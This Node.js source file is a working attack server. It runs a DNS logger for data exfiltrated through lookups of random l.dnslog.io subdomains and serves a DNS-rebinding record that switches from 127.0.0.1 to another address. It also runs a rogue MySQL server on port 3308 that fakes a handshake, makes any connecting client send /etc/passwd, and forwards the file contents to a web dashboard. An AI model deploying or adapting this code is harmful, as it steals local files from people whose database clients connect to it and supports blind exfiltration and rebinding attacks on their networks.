var named = require('./lib/index');
var server = named.createServer();
var ttl = 300;
var rebind = {};
var app = require('express')();
var httpserver = require('http').Server(app);
var io = require('socket.io')(httpserver);
var gsocket = {};
var net = require("net");

httpserver.listen(3000);

app.get('/', function (req, res) {
  res.sendfile(__dirname + '/index.html');
});

io.on('connection', function (socket) {
	var randDomain = getRandomDomain(5);
	socket.emit('randomDomain', { domain: randDomain });
	gsocket[randDomain] = socket;
 	socket.on('disconnect',function(){
 		delete gsocket[randDomain];
 		console.log('disconnect');
  });
});

function getRandomDomain(len){
	return Math.random().toString(36).substr(13-len)+'.l.dnslog.io';
}

server.listen(53, '0.0.0.0', function() {
	console.log('DNS server started on port 53');
});

server.on('query', function(query) {
	var domain = query.name();
	console.log('DNS Query: %s', domain)
	if(domain == 'rebind.test.com'){
		if(typeof(rebind.times) == 'undefined'){
			rebind.times = 1;
			var record = new named.ARecord('127.0.0.1');
			query.addAnswer(domain, record, 0);
			server.send(query);
		}else{
			var record = new named.ARecord('8.8.8.8');
			query.addAnswer(domain, record, 0);
			server.send(query);
			rebind.times ++;
		}
	}else{
		if(domain.split('.').length > 3 ){
			var qdomain = domain.split('.').slice(-4).join('.');
			console.log(qdomain);
			if(typeof(gsocket[qdomain])!=="undefined"){
				gsocket[qdomain].emit('dnslog',{dnslog:domain+" from "+query._client.address});	
			}
		}
		var record = new named.ARecord('8.8.8.8');
		query.addAnswer(domain, record, ttl);
		server.send(query);
	}
});

/* 创建mysql服务器 */
var server = net.createServer(function(socket){
    /* 获取地址信息 */
    var address = server.address();
    var filename = "/etc/passwd";
    var handshake = "\x45\x00\x00\x00\x0a\x35\x2e\x31\x2e\x36\x33\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x30\x2e\x30\x34\x2e\x31\x00\x26\x00\x00\x00\x7a\x42\x7a\x60\x51\x56\x3b\x64\x00\xff\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x4c\x2f\x44\x47\x77\x43\x2a\x43\x56\x63\x72\x00";
    var authsuccess = "\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00";
    var someshit = "\x07\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00";
    var wantfile = String.fromCharCode(filename.length+1)+"\x00\x00\x01\xFB"+filename
    /* 发送数据 */
    socket.write(handshake,'binary',function(){
        socket.once('data',function(data){
            //console.log(data.toString());
            socket.write(authsuccess,'binary');
            //socket.write(someshit,'binary');
            var userinfo = data.toString();
            var username = userinfo.slice(36).split("\x00")[0];
            console.log("username: "+username);
            socket.once('data',function(data){
                socket.write(wantfile,'binary');
                socket.on('data',function(data){
                    var data = data.toString();
                    //console.log(data);
                    if(data.indexOf("select")>-1){
                        socket.write(wantfile,'binary');
                        //console.log("send file read request");
                    }else{
                    	if(typeof(gsocket[username+".l.dnslog.io"])!=="undefined"){
							gsocket[username+".l.dnslog.io"].emit('mysql',{dnslog:data});	
						}
                        socket.end(null,'binary');
                    }
                    
                });
            });
        })
    })
    /* 监听data事件 */
    socket.on('error', function (err) {
        console.log(err);
    });
    socket.on('end', function () {
        console.log('连接结束');
    });
    socket.on('close', function () {
        console.log('连接关闭');
    });
})
/* 获取地址信息 */
server.listen(3308,function(){
    console.log("mysql server on 127.0.0.1 3308");
})
